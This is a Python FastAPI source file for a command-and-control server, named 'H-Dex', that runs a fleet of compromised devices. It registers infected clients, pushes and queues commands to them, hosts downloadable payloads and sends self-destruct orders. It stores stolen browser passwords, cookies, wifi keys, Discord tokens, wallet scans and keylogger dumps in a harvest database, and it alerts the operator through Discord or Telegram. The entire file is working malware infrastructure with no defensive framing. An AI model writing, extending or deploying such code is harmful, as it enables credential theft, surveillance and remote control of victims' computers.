import asyncio
import json
import logging
import os
import time
import sys
import psutil
from datetime import datetime
import threading
import sqlite3

# Fast API imports for health check and speed
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, UploadFile, File
from fastapi.responses import HTMLResponse, JSONResponse
import uvicorn

# Optimization: Use uvloop if available (standard on Linux/HF)
try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass

# Logging setup
LOG_FORMAT = '%(asctime)s | %(levelname)-8s | %(message)s'
logging.basicConfig(level=logging.INFO, format=LOG_FORMAT)
logger = logging.getLogger('H-Dex-Ultra')

app = FastAPI(title="H-Dex Ultimate HF Server")

# Configuration
DASHBOARD_TOKEN = os.environ.get('DASHBOARD_TOKEN', 'hdex_admin_2026')
PORT = int(os.environ.get('PORT', 7860))  # HF Mandatory Port
HEARTBEAT_INTERVAL = 20
HEARTBEAT_TIMEOUT = 45
MAX_LOG_SIZE = 500

# NEW: Notification Config
DISCORD_WEBHOOK = os.environ.get('DISCORD_WEBHOOK', '')
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN', '')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')

class HDexServerState:
    def __init__(self):
        self.clients = {}           # {device_id: {"websocket": ws, "info": {...}}}
        self.dashboards = set()     # {WebSocket}
        self.start_time = time.time()
        self.total_messages = 0
        self.peak_clients = 0
        self.db_path = "hdex_vault_ultra.db"
        self._init_db()

    def _init_db(self):
        conn = sqlite3.connect(self.db_path)
        cur = conn.cursor()
        
        # 1. Devices Table (Master List)
        cur.execute('''CREATE TABLE IF NOT EXISTS devices (
            id TEXT PRIMARY KEY, 
            name TEXT, 
            ip TEXT, 
            os TEXT, 
            tag TEXT,
            notes TEXT,
            last_seen DATETIME, 
            status TEXT,
            is_active INTEGER DEFAULT 1,
            full_info TEXT)''') # Stores JSON blob of all system info
            
        # 1.1 Blacklist Table (Banned HWIDs)
        cur.execute('''CREATE TABLE IF NOT EXISTS blacklist (
            id TEXT PRIMARY KEY,
            reason TEXT,
            timestamp DATETIME)''')
            
        # 2. Activity Logs (Real-time events)
        cur.execute('''CREATE TABLE IF NOT EXISTS events (
            id INTEGER PRIMARY KEY AUTOINCREMENT, 
            timestamp DATETIME, 
            type TEXT, 
            sender_id TEXT, 
            target_id TEXT, 
            raw_data TEXT)''')
            
        # 3. Harvested Records (Captured data like passwords, wifi, cookies)
        cur.execute('''CREATE TABLE IF NOT EXISTS harvested_records (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME,
            client_id TEXT,
            type TEXT,
            content TEXT)''')

        # 4. Auto-Tasking (Queued commands for offline devices)
        cur.execute('''CREATE TABLE IF NOT EXISTS pending_tasks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            client_id TEXT,
            task_json TEXT,
            timestamp DATETIME)''')
        
        # 5. Payload Registry (Tracking hosted files)
        cur.execute('''CREATE TABLE IF NOT EXISTS payloads (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT UNIQUE,
            filename TEXT,
            description TEXT,
            downloads INTEGER DEFAULT 0)''')
            
        conn.commit()
        conn.close()

    def save_event(self, msg_type, sender, target, raw_json):
        """Log every single message into the database"""
        try:
            conn = sqlite3.connect(self.db_path)
            cur = conn.cursor()
            cur.execute('''INSERT INTO events (timestamp, type, sender_id, target_id, raw_data)
                VALUES (?, ?, ?, ?, ?)''',
                (datetime.now().isoformat(), msg_type, sender, target, json.dumps(raw_json)))
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"Event Log Error: {e}")

    def save_harvest(self, client_id, h_type, content):
        """Save harvested data (passwords, cookies, etc.) permanently"""
        try:
            conn = sqlite3.connect(self.db_path)
            cur = conn.cursor()
            cur.execute('''INSERT INTO harvested_records (timestamp, client_id, type, content)
                VALUES (?, ?, ?, ?)''',
                (datetime.now().isoformat(), client_id, h_type, json.dumps(content)))
            conn.commit()
            conn.close()
            logger.info(f"💾 Record Saved [{h_type}] for {client_id}")
        except Exception as e:
            logger.error(f"Harvest DB Error: {e}")

    def update_device_db(self, info):
        """Keep device info updated including full JSON info"""
        try:
            conn = sqlite3.connect(self.db_path)
            cur = conn.cursor()
            cur.execute('''INSERT INTO devices (id, name, ip, os, tag, last_seen, status, full_info, is_active)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, 1) ON CONFLICT(id) DO UPDATE SET
                last_seen=excluded.last_seen, 
                status=excluded.status, 
                ip=excluded.ip,
                tag=excluded.tag,
                full_info=excluded.full_info''',
                (info['id'], info.get('name'), info.get('ip'), info.get('os'), info.get('tag', 'Default'),
                 datetime.now().isoformat(), 'online', json.dumps(info)))
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"Device DB Error: {e}")

    async def notify(self, title, message):
        """Send notifications to Discord/Telegram if configured"""
        text = f"🚨 **H-DEX ALERT: {title}**\n{message}"
        
        # 1. Discord
        if DISCORD_WEBHOOK:
            try:
                import requests
                requests.post(DISCORD_WEBHOOK, json={"content": text}, timeout=5)
            except: pass
            
        # 2. Telegram
        if TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
            try:
                import requests
                api_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
                requests.post(api_url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text}, timeout=5)
            except: pass

    def get_stats(self):
        process = psutil.Process(os.getpid())
        return {
            "uptime": str(datetime.now() - datetime.fromtimestamp(self.start_time)),
            "active_clients": len(self.clients),
            "active_dashboards": len(self.dashboards),
            "ram_usage": f"{process.memory_info().rss / 1024 / 1024:.1f} MB",
            "cpu_percent": f"{psutil.cpu_percent()}%",
            "total_messages": self.total_messages,
            "peak_clients": self.peak_clients,
            "db_size": f"{os.path.getsize(self.db_path) / 1024 / 1024:.2f} MB" if os.path.exists(self.db_path) else "0 MB",
            "payloads_count": self.get_payload_count(),
            "is_kill_switch_on": getattr(self, 'global_kill_switch', False)
        }

    def is_banned(self, client_id):
        try:
            conn = sqlite3.connect(self.db_path)
            cur = conn.cursor()
            cur.execute("SELECT 1 FROM blacklist WHERE id = ?", (client_id,))
            res = cur.fetchone()
            conn.close()
            return res is not None
        except: return False

    def ban_device(self, client_id, reason="Security Policy Violation"):
        try:
            conn = sqlite3.connect(self.db_path)
            cur = conn.cursor()
            cur.execute("INSERT OR REPLACE INTO blacklist (id, reason, timestamp) VALUES (?, ?, ?)",
                        (client_id, reason, datetime.now().isoformat()))
            conn.commit()
            conn.close()
            return True
        except: return False

    def toggle_device_status(self, client_id, active: bool):
        try:
            conn = sqlite3.connect(self.db_path)
            cur = conn.cursor()
            cur.execute("UPDATE devices SET is_active = ? WHERE id = ?", (1 if active else 0, client_id))
            conn.commit()
            conn.close()
            return True
        except: return False

    def get_device_history(self, client_id, limit=50):
        try:
            conn = sqlite3.connect(self.db_path)
            cur = conn.cursor()
            cur.execute("SELECT * FROM events WHERE target_id = ? ORDER BY timestamp DESC LIMIT ?", (client_id, limit))
            cols = [c[0] for c in cur.description]
            res = [dict(zip(cols, row)) for row in cur.fetchall()]
            conn.close()
            return res
        except: return []

    def set_device_notes(self, client_id, notes):
        try:
            conn = sqlite3.connect(self.db_path)
            cur = conn.cursor()
            cur.execute("UPDATE devices SET notes = ? WHERE id = ?", (notes, client_id))
            conn.commit()
            conn.close()
            return True
        except: return False

    def get_payload_count(self):
        try:
            conn = sqlite3.connect(self.db_path)
            cur = conn.cursor()
            cur.execute("SELECT COUNT(*) FROM payloads")
            count = cur.fetchone()[0]
            conn.close()
            return count
        except: return 0

    def add_pending_task(self, client_id, task_data):
        try:
            conn = sqlite3.connect(self.db_path)
            cur = conn.cursor()
            cur.execute("INSERT INTO pending_tasks (client_id, task_json, timestamp) VALUES (?, ?, ?)",
                        (client_id, json.dumps(task_data), datetime.now().isoformat()))
            conn.commit()
            conn.close()
            return True
        except: return False

    async def flush_pending_tasks(self, client_id, websocket):
        try:
            conn = sqlite3.connect(self.db_path)
            cur = conn.cursor()
            cur.execute("SELECT id, task_json FROM pending_tasks WHERE client_id = ? OR client_id = 'ALL'", (client_id,))
            tasks = cur.fetchall()
            for tid, tjson in tasks:
                await websocket.send_text(tjson)
                cur.execute("DELETE FROM pending_tasks WHERE id = ?", (tid,))
                logger.info(f"⚡ Flushed Task {tid} to {client_id}")
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"Task Flush Error: {e}")

state = HDexServerState()

@app.get("/")
async def health_check():
    """Professional Admin Panel"""
    # Try to load external template, fallback to inline if not found
    template_path = os.path.join(os.path.dirname(__file__), "admin_panel.html")
    if os.path.exists(template_path):
        with open(template_path, "r", encoding="utf-8") as f:
            return HTMLResponse(content=f.read())
    
    # Fallback simple response
    return HTMLResponse(content="""
    <!DOCTYPE html>
    <html>
    <head><title>H-DEX Server</title></head>
    <body style="background:#0f172a;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;">
        <div style="text-align:center;">
            <h1>H-DEX Server Online</h1>
            <p>Template file not found. Please ensure templates/admin_panel.html exists.</p>
        </div>
    </body>
    </html>
    """)

@app.get("/stats")
async def get_json_stats(token: str = None):
    """JSON API for integration"""
    if token != DASHBOARD_TOKEN:
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    return state.get_stats()

@app.get("/vault")
async def get_vault_data(token: str = None, type: str = "harvest", limit: int = 100):
    """Retrieve historical data from the database"""
    if token != DASHBOARD_TOKEN:
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    
    try:
        conn = sqlite3.connect(state.db_path)
        cur = conn.cursor()
        if type == "harvest":
            cur.execute("SELECT * FROM harvested_records ORDER BY timestamp DESC LIMIT ?", (limit,))
            columns = [column[0] for column in cur.description]
            results = [dict(zip(columns, row)) for row in cur.fetchall()]
        elif type == "events":
            cur.execute("SELECT * FROM events ORDER BY timestamp DESC LIMIT ?", (limit,))
            columns = [column[0] for column in cur.description]
            results = [dict(zip(columns, row)) for row in cur.fetchall()]
        else:
            return JSONResponse({"error": "Invalid type"}, status_code=400)
        conn.close()
        return JSONResponse({"type": type, "count": len(results), "data": results})
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)

@app.get("/clean_db")
async def maintenance(token: str, days: int = 7):
    """Clean up old records"""
    if token != DASHBOARD_TOKEN:
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    try:
        conn = sqlite3.connect(state.db_path)
        cur = conn.cursor()
        from datetime import timedelta
        cutoff = (datetime.now() - timedelta(days=days)).isoformat()
        cur.execute("DELETE FROM events WHERE timestamp < ?", (cutoff,))
        rows = cur.rowcount
        cur.execute("VACUUM")
        conn.commit()
        conn.close()
        return {"status": "success", "rows_removed": rows}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.post("/manage/settings")
async def update_settings(token: str, data: dict = None, kill_switch: bool = None):
    if token != DASHBOARD_TOKEN: return JSONResponse({"error": "Unauthorized"}, 401)
    
    # 1. Handle Query Param Kill Switch
    if kill_switch is not None:
        state.global_kill_switch = kill_switch
        logger.warning(f"⚠️ GLOBAL KILL-SWITCH SET TO: {kill_switch}")
        return {"status": "updated", "kill_switch": kill_switch}
        
    # 2. Handle JSON Body (Ban, Toggle, etc.)
    if data:
        msg_type = data.get("type")
        target_id = data.get("target_id")
        
        if msg_type == "ban_device":
            state.ban_device(target_id, data.get("reason", "Banned via Admin Panel"))
            if target_id in state.clients:
                try: await state.clients[target_id]["ws"].send_json({"type": "self_destruct"})
                except: pass
                await disconnect_client(target_id)
            return {"status": "banned", "target": target_id}
            
        elif msg_type == "toggle_device":
            active = data.get("active", True)
            state.toggle_device_status(target_id, active)
            if not active and target_id in state.clients:
                await disconnect_client(target_id)
            return {"status": "toggled", "target": target_id, "active": active}
            
    return {"status": "no_action"}

@app.get("/manage/blacklist")
async def get_blacklist(token: str):
    if token != DASHBOARD_TOKEN: return JSONResponse({"error": "Unauthorized"}, 401)
    conn = sqlite3.connect(state.db_path)
    cur = conn.cursor()
    cur.execute("SELECT * FROM blacklist")
    res = cur.fetchall()
    conn.close()
    return [{"id": r[0], "reason": r[1], "time": r[2]} for r in res]

@app.get("/manage/devices")
async def get_all_devices(token: str):
    if token != DASHBOARD_TOKEN: return JSONResponse({"error": "Unauthorized"}, 401)
    conn = sqlite3.connect(state.db_path)
    cur = conn.cursor()
    cur.execute("SELECT id, name, ip, os, status, is_active FROM devices")
    res = cur.fetchall()
    conn.close()
    return [{"id": r[0], "name": r[1], "ip": r[2], "os": r[3], "status": r[4], "is_active": bool(r[5])} for r in res]

@app.post("/manage/unban")
async def unban_device(token: str, client_id: str):
    if token != DASHBOARD_TOKEN: return JSONResponse({"error": "Unauthorized"}, 401)
    try:
        conn = sqlite3.connect(state.db_path)
        cur = conn.cursor()
        cur.execute("DELETE FROM blacklist WHERE id = ?", (client_id,))
        conn.commit()
        conn.close()
        return {"status": "success"}
    except: return {"status": "error"}

@app.get("/manage/history/{client_id}")
async def get_client_history(client_id: str, token: str):
    if token != DASHBOARD_TOKEN: return JSONResponse({"error": "Unauthorized"}, 401)
    return state.get_device_history(client_id)

@app.post("/manage/notes")
async def update_notes(token: str, client_id: str, notes: str):
    if token != DASHBOARD_TOKEN: return JSONResponse({"error": "Unauthorized"}, 401)
    state.set_device_notes(client_id, notes)
    return {"status": "success"}

@app.get("/manage/payloads")
async def list_payloads(token: str = None):
    if token != DASHBOARD_TOKEN: return JSONResponse({"status": "unauthorized"}, 401)
    try:
        conn = sqlite3.connect(state.db_path)
        cur = conn.cursor()
        cur.execute("SELECT * FROM payloads")
        cols = [c[0] for c in cur.description]
        res = [dict(zip(cols, row)) for row in cur.fetchall()]
        conn.close()
        return res
    except: return []

@app.post("/manage/payload/upload")
async def upload_payload(token: str, file: UploadFile = File(...)):
    if token != DASHBOARD_TOKEN: return JSONResponse({"error": "Unauthorized"}, 401)
    try:
        if not os.path.exists("payloads"):
            os.makedirs("payloads")
        
        filename = file.filename
        file_path = os.path.join("payloads", filename)
        
        with open(file_path, "wb") as buffer:
            import shutil
            shutil.copyfileobj(file.file, buffer)
            
        return {"status": "uploaded", "filename": filename}
    except Exception as e:
        return JSONResponse({"error": str(e)}, 500)

@app.get("/dl/{payload_name}")
async def download_payload(payload_name: str):
    """Download a payload by its registered name"""
    try:
        conn = sqlite3.connect(state.db_path)
        cur = conn.cursor()
        cur.execute("SELECT filename FROM payloads WHERE name = ?", (payload_name,))
        row = cur.fetchone()
        if row:
            from fastapi.responses import FileResponse
            cur.execute("UPDATE payloads SET downloads = downloads + 1 WHERE name = ?", (payload_name,))
            conn.commit()
            conn.close()
            return FileResponse(f"payloads/{row[0]}")
        conn.close()
    except: pass
    return JSONResponse({"error": "Payload not found"}, 404)

@app.post("/manage/payload/register")
async def register_payload(token: str, name: str, filename: str, description: str = ""):
    if token != DASHBOARD_TOKEN: return JSONResponse({"error": "Unauthorized"}, 401)
    try:
        conn = sqlite3.connect(state.db_path)
        cur = conn.cursor()
        cur.execute("INSERT INTO payloads (name, filename, description) VALUES (?, ?, ?)",
                    (name, filename, description))
        conn.commit()
        conn.close()
        return {"status": "registered", "name": name}
    except Exception as e:
        return JSONResponse({"error": str(e)}, 500)

@app.delete("/manage/payload/{payload_name}")
async def delete_payload(payload_name: str, token: str):
    if token != DASHBOARD_TOKEN: return JSONResponse({"error": "Unauthorized"}, 401)
    try:
        conn = sqlite3.connect(state.db_path)
        cur = conn.cursor()
        cur.execute("SELECT filename FROM payloads WHERE name = ?", (payload_name,))
        row = cur.fetchone()
        if row:
            filename = row[0]
            cur.execute("DELETE FROM payloads WHERE name = ?", (payload_name,))
            conn.commit()
            # Try to delete file
            file_path = f"payloads/{filename}"
            if os.path.exists(file_path):
                os.remove(file_path)
            conn.close()
            return {"status": "deleted", "name": payload_name}
        conn.close()
        return JSONResponse({"error": "Payload not found"}, 404)
    except Exception as e:
        return JSONResponse({"error": str(e)}, 500)


@app.post("/send_command")
async def send_command_http(token: str, cmd: dict):
    if token != DASHBOARD_TOKEN: return JSONResponse({"error": "Unauthorized"}, 401)
    
    target_id = cmd.get("target_id")
    msg_type = cmd.get("type")
    
    if not target_id or not msg_type:
        return JSONResponse({"error": "Missing parameters"}, 400)

    # Save command to event log
    state.save_event(f"CMD_{msg_type}", "ADMIN_HTTP", target_id, cmd)

    # Handle logic
    if target_id in state.clients:
        try:
            await state.clients[target_id]["ws"].send_json(cmd)
            return {"status": "sent", "target": target_id}
        except:
            return {"status": "error", "message": "Failed to send to active client"}
    else:
        # Check if ALL or TAG?
        if target_id == "ALL":
             count = 0
             for cid, cdata in list(state.clients.items()):
                 try: 
                     await cdata["ws"].send_json(cmd)
                     count += 1
                 except: pass
             return {"status": "sent_all", "count": count}
        
        # Queue task
        state.add_pending_task(target_id, cmd)
        return {"status": "queued", "target": target_id}

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    client_id = None
    is_dashboard = False

    try:
        while True:
            message = await websocket.receive_text()
            state.total_messages += 1
            data = json.loads(message)
            msg_type = data.get("type")

            # 1. Registration
            if msg_type == "register_device":
                info = data.get("info", {})
                client_id = info.get("id") or f"dev_{int(time.time())}"
                
                # Check Global Kill-Switch
                if getattr(state, 'global_kill_switch', False):
                    logger.warning(f"🚫 Connection Rejected: Global Kill-Switch Active ({client_id})")
                    await websocket.close()
                    return

                # Check Blacklist
                if state.is_banned(client_id):
                    logger.warning(f"🚫 Banned Client Attempted Connection: {client_id}")
                    # Send self-destruct if possible before closing
                    try: await websocket.send_json({"type": "self_destruct"})
                    except: pass
                    await websocket.close()
                    return

                info["id"] = client_id
                state.clients[client_id] = {"ws": websocket, "info": info}
                state.peak_clients = max(state.peak_clients, len(state.clients))
                
                # DB: Update Master List
                state.update_device_db(info)
                # DB: Log Connectivity Event
                state.save_event("CONN_DEVICE", client_id, "SERVER", info)
                
                logger.info(f"🖥️ Client Registered: {client_id}")
                await state.notify("New Connection", f"Device Connected: {info.get('name')} ({info.get('ip')})\nID: {client_id}")
                await broadcast_to_dashboards({"type": "device_list", "devices": get_minimal_client_list()})
                
                # NEW: Auto-flush tasks
                await state.flush_pending_tasks(client_id, websocket)

            elif msg_type == "register_dashboard":
                if data.get("token") == DASHBOARD_TOKEN:
                    state.dashboards.add(websocket)
                    is_dashboard = True
                    logger.info("🎛️ Dashboard Authenticated")
                    # DB: Log Dashboard Access
                    state.save_event("CONN_ADMIN", "ADMIN", "SERVER", {"ip": websocket.client.host})
                    
                    await websocket.send_json({"type": "auth_success"})
                    await websocket.send_json({"type": "device_list", "devices": get_minimal_client_list()})
                else:
                    await websocket.send_json({"type": "auth_failed"})
                    await websocket.close()
                    return

            # 2. Routing & Data Harvesting Logic
            elif is_dashboard:
                if msg_type == "heartbeat":
                    continue
                    
                target_id = data.get("target_id")
                if msg_type == "broadcast_to_devices" and not target_id:
                    target_id = "ALL"
                
                # Safety check for missing target_id
                if not target_id:
                    logger.warning(f"⚠️ Dashboard sent {msg_type} without target_id")
                    continue

                # Handling Admin Management Commands
                if msg_type == "ban_device":
                    state.ban_device(target_id, data.get("reason"))
                    if target_id in state.clients:
                        try: await state.clients[target_id]["ws"].send_json({"type": "self_destruct"})
                        except: pass
                        await disconnect_client(target_id)
                    await websocket.send_json({"status": "banned", "target": target_id})
                    continue
                
                elif msg_type == "toggle_device":
                    state.toggle_device_status(target_id, data.get("active", True))
                    if not data.get("active") and target_id in state.clients:
                        await disconnect_client(target_id)
                    await websocket.send_json({"status": "toggled", "target": target_id})
                    continue

                elif msg_type == "stop_client":
                    # Stop client(s) - send exit command and disconnect
                    if target_id == "ALL":
                        for cid, cdata in list(state.clients.items()):
                            try:
                                await cdata["ws"].send_json({"type": "stop_client"})
                            except: pass
                            await disconnect_client(cid)
                        await websocket.send_json({"status": "stopped_all"})
                        logger.warning("⚠️ All clients stopped by admin")
                    elif target_id in state.clients:
                        try:
                            await state.clients[target_id]["ws"].send_json({"type": "stop_client"})
                        except: pass
                        await disconnect_client(target_id)
                        await websocket.send_json({"status": "stopped", "target": target_id})
                        logger.info(f"⏹️ Client stopped: {target_id}")
                    continue


                # DB: Log Command being sent
                state.save_event(f"CMD_{msg_type}", "ADMIN", target_id, data)
                
                if target_id == "ALL": # Broadcast mode
                    # Save for future devices
                    state.add_pending_task("ALL", data)
                    for cid, cdata in list(state.clients.items()):
                        try: await cdata["ws"].send_text(message)
                        except: pass
                elif target_id.startswith("TAG:"): # Tag-based broadcast
                    target_tag = target_id.replace("TAG:", "")
                    for cid, cdata in list(state.clients.items()):
                        if cdata["info"].get("tag") == target_tag:
                            try: await cdata["ws"].send_text(message)
                            except: pass
                    # Also queue for future devices with this tag
                    state.add_pending_task(target_id, data)
                elif target_id in state.clients:
                    try:
                        await state.clients[target_id]["ws"].send_text(message)
                    except:
                        # NEW: Queue task if delivery fails
                        state.add_pending_task(target_id, data)
                        await disconnect_client(target_id)
                else:
                    # NEW: Queue task for offline device
                    state.add_pending_task(target_id, data)
                    await websocket.send_json({"type": "command_output", "output": f"Target {target_id} offline. Task queued for auto-execution."})
            
            elif client_id:
                # DB: Log Data coming from client
                state.save_event(f"DATA_{msg_type}", client_id, "ADMIN", data)
                
                # Check for "All Info" sensitive data to store permanently in Harvest DB
                sensitive_types = [
                    "browser_passwords", "get_browser_cookies", "get_wifi_passwords", 
                    "get_discord_tokens", "get_telegram", "scan_wallets", 
                    "file_content", "keylog_dump", "location_info"
                ]
                if msg_type in sensitive_types:
                    state.save_harvest(client_id, msg_type, data)

                # Send to dashboards
                data["sender_id"] = client_id
                await broadcast_to_dashboards(data)

    except WebSocketDisconnect:
        if is_dashboard:
            state.dashboards.discard(websocket)
            logger.info("🔌 Dashboard Disconnected")
        elif client_id:
            await disconnect_client(client_id)

async def disconnect_client(cid):
    if cid in state.clients:
        # DB: Log Offline status
        state.save_event("DISCONN_DEVICE", cid, "SERVER", {})
        
        del state.clients[cid]
        logger.info(f"🔌 Client Offline: {cid}")
        await broadcast_to_dashboards({"type": "device_list", "devices": get_minimal_client_list()})

async def broadcast_to_dashboards(data):
    msg = json.dumps(data)
    to_remove = []
    for ws in list(state.dashboards):
        try: await ws.send_text(msg)
        except: to_remove.append(ws)
    for ws in to_remove: state.dashboards.discard(ws)

def get_minimal_client_list():
    return [{
        "id": cid, 
        "name": c["info"].get("name", "Unknown"),
        "ip": c["info"].get("ip", "Unknown"),
        "os": c["info"].get("os", "win"), # Default to win for icon
        "status": "Online"
    } for cid, c in list(state.clients.items())]

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=PORT, ws_ping_interval=HEARTBEAT_INTERVAL, ws_ping_timeout=HEARTBEAT_TIMEOUT)
